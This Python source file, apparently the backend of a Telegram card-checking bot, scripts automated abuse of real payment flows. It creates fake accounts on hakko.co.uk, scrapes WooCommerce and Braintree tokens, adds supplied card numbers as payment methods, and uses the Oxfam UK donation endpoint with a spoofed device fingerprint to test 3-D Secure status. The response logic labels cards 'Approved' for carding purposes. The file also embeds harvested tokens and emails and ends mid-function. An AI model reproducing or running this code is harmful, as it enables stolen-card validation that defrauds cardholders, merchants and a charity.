from reg import reg
from gates import *
from datetime import datetime, timedelta
from faker import Faker
import threading
import telebot
import requests
import json
import random
import time
from multiprocessing import Process
import string
from telebot import types
import re

import os
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()

		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://hakko.co.uk/my-account/', headers=headers)
	
	
	
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'email': acc,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://hakko.co.uk/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-10-30 07:31:46',
    'wc_order_attribution_session_pages': '13',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': register,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}
	
	response = r.post('https://hakko.co.uk/my-account/', headers=headers, data=data)
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

	response = r.get('https://hakko.co.uk/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'billing_first_name': first_name,
    'billing_last_name': last_name,
    'billing_company': '',
    'billing_country': 'GB',
    'billing_address_1': street_address,
    'billing_address_2': '',
    'billing_city': city,
    'billing_state': 'California',
    'billing_postcode': 'GL56 0SU',
    'billing_phone': num,
    'billing_email': acc,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	
	response = r.post('https://hakko.co.uk/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	response = r.get('https://hakko.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '76c2a9b4-9f0a-4a19-b5d1-9b78bced2aca',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': 'GL56 0SU',
                    'streetAddress': '861 N Sunset Ave',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	tok = response.json()['data']['tokenizeCreditCard']['token']

	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
	    'amount': '0.00',
	    'browserColorDepth': 24,
	    'browserJavaEnabled': False,
	    'browserJavascriptEnabled': True,
	    'browserLanguage': 'ar-EG',
	    'browserScreenHeight': 800,
	    'browserScreenWidth': 360,
	    'browserTimeZone': -180,
	    'deviceChannel': 'Browser',
	    'additionalInfo': {
	        #     'ipAddress': '197.63.121.174',
	        'billingLine1': '861 N Sunset Ave',
	        'billingLine2': '',
	        'billingCity': 'La Puente',
	        'billingState': '',
	        'billingPostalCode': 'GL56 0SU',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '6269188500',
	        'billingGivenName': 'Meroo',
	        'billingSurname': 'Ayman',
	        'email': 'hdjd737@gmail.com',
	    },
	    'challengeRequested': True,
	    'bin': '423067',
	    #     'dfReferenceId': '0_f39019d9-4a94-4393-8ab1-ffd7b59d7f1d',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.106.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 910,
	        'issuerDeviceDataCollectionTimeElapsed': 3322,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.106.0',
	    '_meta': {
	        'merchantAppId': 'hakko.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.106.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '76c2a9b4-9f0a-4a19-b5d1-9b78bced2aca',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	nonc = (response.json()['paymentMethod']['nonce'])
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
		
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonc,
    'braintree_cc_device_data': '{"device_session_id":"48ba20cd6f09dc5749a68506dd05dfd5","fraud_merchant_id":null,"correlation_id":"76c2a9b4-9f0a-4a19-b5d1-9b78bced"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1YjY1NzViNS0wZDVkLTQ4YjYtOWY4Ny1lYmE1NWQyNmM4NmIiLCJpYXQiOjE3MzAyNzM2NjIsImV4cCI6MTczMDI4MDg2MiwiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.leT5UoODvDMPw5eAXLA0uTbyNMIcjT0t3SLx1L8Hvjk"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
		
	response = r.post(
	    'https://hakko.co.uk/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		#print(result) 
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			time.sleep(5)
			result = "try again"
		else:
			result = "Error"
			#print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
			return 'Approved'
	else:
		return result

		
		
		
		
		
		
		
		
		

import jwt
import re,base64
import user_agent


us = user_agent.generate_user_agent()
def vbv(ccx):
	import requests
	import re
	import random
	import string
	import base64
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	proxies = ['43.133.59.220:3128']
	user = user_agent.generate_user_agent()
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	r = requests.session()

	headers = {
	    'user-agent': us,
	}
	response = r.get('https://www.oxfam.org.uk/_donate/api/configuration/zakat/', headers=headers)
	no=response.json()['payment_methods'][0]['options']['client_authorization']
	encoded_text = no
	
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '29fd59fa-6d49-469d-a7a3-6346ae1fbc81',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	import requests
	headers = {
	    'authority': 'centinelapi.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	    'x-cardinal-tid': 'Tid-b6ac952f-8287-4d0f-b116-a45b4f379a60',
	}
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': None,
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	payload = response.json()['CardinalJWT']
	
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	
	reference_id = payload_dict['ReferenceId']
	import requests
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=6241bfe007f6d918af7145b3&tmEventType=PAYMENT&referenceId=0_e46601f4-7ea9-4dd6-b622-8ec4e5fd83d9&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': us,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'e8ea0ac75c934e00093b220b0387b191',
	    'FingerprintingTime': 1226,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'en-US',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '6241bfe007f6d918af7145b3',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': 'https://www.oxfam.org.uk/',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2213740458015265,
	        'Resolution': '873x393',
	        'UsableResolution': '873x393',
	        'CCAScreenSize': '02',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -180,
	    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': 'cc6a1f58-3b7c-46cd-ad99-18ef1837da9e',
	}
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    headers=headers,
	    json=json_data,
	)
	import requests
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '29fd59fa-6d49-469d-a7a3-6346ae1fbc81',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'john  mayer ',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	}
	json_data = {
	    'amount': '5.00',
	    'additionalInfo': {
	        'billingLine1': 'T F G Fabrics',
	        'billingLine2': 'Guardian House, Gatherley Road Industrial Estate',
	        'billingCity': 'Richmond',
	        'billingPostalCode': 'DL10 7JQ',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '9108749652',
	        'billingGivenName': 'john ',
	        'billingSurname': 'mayer ',
	        'email': 'magdyjohn25@gmail.com',
	    },
	    'bin': '518155',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.76.4',
	        'cardinalDeviceDataCollectionTimeElapsed': 458,
	        'issuerDeviceDataCollectionTimeElapsed': 7557,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.76.4',
	    '_meta': {
	        'merchantAppId': 'www.oxfam.org.uk',
	        'platform': 'web',
	        'sdkVersion': '3.76.4',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '29fd59fa-6d49-469d-a7a3-6346ae1fbc81',
	    },
	}
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/27q44ks74yr25b2f/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

	
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	
	if 'successful' in vbv:
	       return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	

	

		
		
		
		
		
		










def Tele1(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
